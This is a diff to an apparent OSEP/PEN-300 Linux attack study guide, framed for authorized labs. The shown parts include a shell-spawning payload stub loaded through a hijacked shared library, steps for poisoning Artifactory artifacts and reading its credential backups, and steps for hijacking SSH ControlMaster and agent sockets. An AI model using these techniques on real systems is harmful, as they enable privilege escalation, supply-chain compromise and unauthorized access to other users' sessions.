@@ -6,7 +6,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 
 > Scenario map: 36 Linux upload site runs ELF but still requires a business check · 37 Linux target has AV · 38 Linux program loads a shared library from a path you control · 39 sudo allows only one editor/interpreter · 40 you can overwrite an artifact but cannot log into the consumer hosts · 48 no SSH password, but an already-authenticated reusable connection exists.
 >
-> Aligned with cheat-sheet sections: `Payloads (XOR Payload Encoder / Simple Loader / Shared Library LD PRELOAD / Shared Library LD LIBRARY Path)`, `Abusing SUIDs`, `SSH Hijacking with ControlMaster / SSH Agent Forwarding`, `Artifactory (JFrog)`.
+> Aligned with PEN-300 (`pen-300.pdf`): Chapter 15 *Linux Post-Exploitation* (§15.2 *Bypassing Antivirus*, §15.3 *Shared Libraries (`LD_LIBRARY_PATH` & `LD_PRELOAD`)*) & Chapter 19 *Linux Lateral Movement* (§19.1 *SSH Keys, ControlMaster & SSH-Agent Forwarding*, §19.2.8–19.2.12 *Artifactory (JFrog)*).
 >
 > Placeholders: `LHOST` (attacker IP) `LPORT` (listener port) `TARGET` (target address) `USER` `PASS` `DOMAIN` `PAYLOAD`. Commands assume x86_64 Linux unless noted.
 
@@ -568,7 +568,7 @@ A higher-privilege program on the target (service / cron / triggered script) res
 **B. LD_LIBRARY_PATH line (`m13-shared-library-ldlibrarypath.c`)**
 1. Program is missing a lib (`ldd` shows `not found`, e.g. `libcrypto.so.1.1`) → the library **name must match exactly**.
 2. Place a same-named `.so` in a directory you control; prepend search with `LD_LIBRARY_PATH=/controlled/dir`: `LD_LIBRARY_PATH=/tmp/x TARGET_BIN`.
-3. The `.so` must export symbols the program uses (stub whatever is missing: copy the export table with `nm -D` from the real lib, or use the “dlopen real lib then forward” pattern from the cheat sheet), and also run your code from `__attribute__((constructor))`.
+3. The `.so` must export symbols the program uses (stub whatever is missing: copy the export table with `nm -D` from the real lib, or use the “dlopen real lib then forward” pattern from the quick-reference notes), and also run your code from `__attribute__((constructor))`.
 4. Confirm resolution with `ldd`: `LD_LIBRARY_PATH=/controlled/dir ldd TARGET_BIN` should show your `.so`.
 5. Trigger the program (service restart / job / wait for cron) and confirm your code runs as the target identity.
 
@@ -657,6 +657,8 @@ static void fire_payload(void)
         pid_t grand = fork();
         if (grand == 0) {
             setsid();
+            unsetenv("LD_PRELOAD");
+            unsetenv("LD_LIBRARY_PATH");
             execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
             _exit(127);
         }
@@ -756,6 +758,8 @@ static void fire_payload(void)
         pid_t grand = fork();
         if (grand == 0) {
             setsid();
+            unsetenv("LD_PRELOAD");
+            unsetenv("LD_LIBRARY_PATH");
             execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
             _exit(127);
         }
@@ -1203,7 +1207,7 @@ The lab has an artifact repository / distribution service (aligned with the chea
 ### Prepare (attacker)
 1. Confirm Artifactory process and layout (common path `/opt/jfrog/artifactory/`):
    - `ps aux | grep artifactory`
-   - Backup/cred clues: `/opt/jfrog/artifactory/var/backup/access` (encrypted creds/DB backups), or data dir `.../var/data/access/derby` (copy out offline if needed — see cheat sheet).
+   - Backup/cred clues: `/opt/jfrog/artifactory/var/backup/access` (encrypted creds/DB backups), or data dir `.../var/data/access/derby` (copy out offline if needed — see quick-reference notes).
 2. Locate the target artifact file: search filestore by name/checksum (Artifactory usually has a binary store + metadata); confirm **arch and format** (`file`, `readelf -h`: x86_64 consumer cannot run an arm artifact).
 3. Build the replacement:
    - Preserve original business behavior (if the scenario requires the consumer to keep working), and layer your code; or wrap as “callback first, then original logic”.
@@ -1546,7 +1550,7 @@ You already have a shell as some user on a Linux host (e.g. a web service user, 
 1. Enumerate reusable assets:
    - ControlMaster sockets: `find ~/.ssh -name 'control*' -o -path '*controlmaster*' 2>/dev/null`, `ls -la ~/.ssh/`, `ps aux | grep 'ssh -M'`, `lsof -U 2>/dev/null | grep -i control` (same-user visible).
    - Agent: `ls /tmp/ssh-*/agent.* 2>/dev/null`, `echo $SSH_AUTH_SOCK`, `ssh-add -l`.
-2. If config has no ControlMaster but you can write the user’s home and they have an active connection: inject `~/.ssh/config` so later connects reuse (`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`) — see cheat sheet.
+2. If config has no ControlMaster but you can write the user’s home and they have an active connection: inject `~/.ssh/config` so later connects reuse (`ControlMaster auto; ControlPath ~/.ssh/controlmaster/%r@%h:%p; ControlPersist 10m`) — see quick-reference notes.
 3. Prepare identity-check commands locally/on target (`id`, `hostname`).
 
 ### Procedure
